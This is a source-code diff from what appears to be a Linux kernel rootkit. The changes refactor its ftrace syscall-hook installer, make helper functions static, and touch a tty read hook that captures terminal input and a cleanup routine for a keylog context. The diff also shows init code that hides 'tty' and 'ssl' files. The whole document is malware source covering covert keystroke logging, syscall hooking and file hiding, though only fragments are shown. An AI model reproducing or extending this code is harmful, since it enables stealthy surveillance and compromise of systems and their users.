@@ -886,7 +886,7 @@ static struct tty_ctx tty_sys_ctx = {
 	.fp = NULL,
 };
 
-void _keylog_cleanup(void)
+static void _keylog_cleanup(void)
 {
 	kv_tty_close(&tty_sys_ctx);
 	memset(&tty_sys_ctx, 0, sizeof(struct tty_ctx));
@@ -924,7 +924,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		if (copy_from_user(ttybuf, buf, rv))
 			goto out;
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
-		struct iovec *iov = iter_iov(to);
+		const struct iovec *iov = iter_iov(to);
 		if (!iov || !iov->iov_base)
 			goto out;
 
@@ -1254,7 +1254,7 @@ static struct ftrace_hook ft_hooks[] = {
 	{ NULL, NULL, NULL },
 };
 
-int fh_install_hook(struct ftrace_hook *hook)
+static int _fh_install_hook(struct ftrace_hook *hook)
 {
 	int err;
 
@@ -1283,7 +1283,7 @@ int fh_install_hook(struct ftrace_hook *hook)
 	return 0;
 }
 
-void fh_remove_hook(struct ftrace_hook *hook)
+static void _fh_remove_hook(struct ftrace_hook *hook)
 {
 	int err;
 #ifdef DEBUG_RING_BUFFER
@@ -1298,7 +1298,7 @@ void fh_remove_hook(struct ftrace_hook *hook)
 		prerr("ftrace_set_filter_ip() failed: %d\n", err);
 }
 
-int fh_install_hooks(struct ftrace_hook *hooks)
+static int _fh_install_hooks(struct ftrace_hook *hooks)
 {
 	int rc = 0;
 	size_t i = 0;
@@ -1306,23 +1306,23 @@ int fh_install_hooks(struct ftrace_hook *hooks)
 	for (; hooks[i].name != NULL; i++) {
 		prinfo("Installing: '%s' syscall=%d\n", hooks[i].name,
 		       hooks[i].syscall);
-		if ((rc = fh_install_hook(&hooks[i])))
+		if ((rc = _fh_install_hook(&hooks[i])))
 			goto unroll;
 	}
 	goto leave;
 unroll:
 	while (i != 0) {
-		fh_remove_hook(&hooks[--i]);
+		_fh_remove_hook(&hooks[--i]);
 	}
 leave:
 	return rc;
 }
 
-void fh_remove_hooks(struct ftrace_hook *hooks)
+static void _fh_remove_hooks(struct ftrace_hook *hooks)
 {
 	size_t i = 0;
 	for (; hooks[i].name != NULL; i++) {
-		fh_remove_hook(&hooks[i]);
+		_fh_remove_hook(&hooks[i]);
 	}
 }
 
@@ -1396,7 +1396,7 @@ bool sys_init(void)
 		fs_add_name_ro(tty, 0);
 		fs_add_name_ro(ssl, 0);
 
-		rc = !fh_install_hooks(ft_hooks);
+		rc = !_fh_install_hooks(ft_hooks);
 		if (rc) {
 			for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
 				prinfo("sys_init: ftrace hook %d on %s\n", idx,
@@ -1418,7 +1418,7 @@ void sys_deinit(void)
 {
 	struct sys_addr_list *sl, *sl_safe;
 
-	fh_remove_hooks(ft_hooks);
+	_fh_remove_hooks(ft_hooks);
 	fs_file_rm(sys_get_sslfile());
 	_keylog_cleanup();
 
